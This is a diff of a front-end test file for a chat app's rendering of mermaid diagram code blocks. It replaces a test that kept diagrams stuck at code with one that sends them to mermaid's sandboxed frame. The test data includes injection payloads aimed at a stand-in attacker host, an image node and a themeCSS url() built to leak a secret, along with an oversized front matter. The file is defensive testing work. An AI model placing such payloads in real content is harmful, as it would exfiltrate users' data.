@@ -384,19 +384,19 @@ describe("```mermaid fences", () => {
     expect(img?.getAttribute("aria-description")).toBe("Do pedido & aprovação ao deploy");
   });
 
-  test("a source that would make the page load something never reaches mermaid and stays code", async () => {
-    const image = 'flowchart TD\n  A@{ img: "https://attacker.invalid/p.png?leak=SECRET" }';
-    const view = render(<MessageBody body={`Veja:\n\n${fence(image)}`} />);
-    await settle();
-    expect(asked).toEqual([]);
-    expect(view.container.querySelector(".code-card__code")?.textContent).toBe(image);
-    expect(view.container.querySelector("img")).toBeNull();
-    // A front matter with only a title still draws.
-    const titled = `---\ntitle: Fluxo\n---\n${FLOW}`;
-    view.rerender(<MessageBody body={fence(titled)} />);
-    await settle();
-    expect(asked).toEqual([titled]);
-    expect(view.container.querySelector(".code-card__preview img")).not.toBeNull();
+  test("a diagram goes to mermaid as written: nothing is refused for what it says", async () => {
+    // What would load is for mermaid's frame to stop (lib/mermaid.ts), so these draw like any other.
+    const sources = [
+      'flowchart TD\n  A@{ img: "https://attacker.invalid/p.png?leak=SECRET" }',
+      `%%{init: {"themeCSS": ".node rect { fill: url(https://attacker.invalid/p.png) }"}}%%\n${FLOW}`,
+      "flowchart LR\n  A[getSignedUrl(x)] --> B[S3]",
+      // Front matter that never closes, near the size limit: nothing on the page reads it before mermaid does.
+      `---\n${"title: x\n".repeat(5000)}flowchart LR\n  A --> B`,
+    ];
+    const el = render(<Markdown source={sources.map(fence).join("\n\n")} />).container;
+    await settle(sources.length * 3);
+    expect(asked).toEqual(sources);
+    expect(el.querySelectorAll(".code-card__preview img")).toHaveLength(sources.length);
   });
 
   test("a diagram longer than mermaid draws stays code", async () => {
@@ -413,11 +413,11 @@ describe("```mermaid fences", () => {
     await settle();
     expect(asked).toEqual([]);
     expect(document.querySelector("img")).toBeNull();
-    // Nothing imports mermaid up front: only the renderer loads it, with import(), when a diagram is drawn.
+    // No code of mermaid's is in the app: only its bundle's address, which the frame loads when a diagram is drawn.
     const src = join(import.meta.dir, "..", "src");
-    const upFront = [...new Glob("**/*.{ts,tsx}").scanSync(src)].filter((f) =>
-      /^\s*import\s+(?!type\b)[^;(]*["']mermaid["']/m.test(readFileSync(join(src, f), "utf8")),
+    const imported = [...new Glob("**/*.{ts,tsx}").scanSync(src)].filter((f) =>
+      /\bimport\b[^;]*?["']mermaid(?:\/[^"'?]*)?["']/.test(readFileSync(join(src, f), "utf8")),
     );
-    expect(upFront).toEqual([]);
+    expect(imported).toEqual([]);
   });
 });
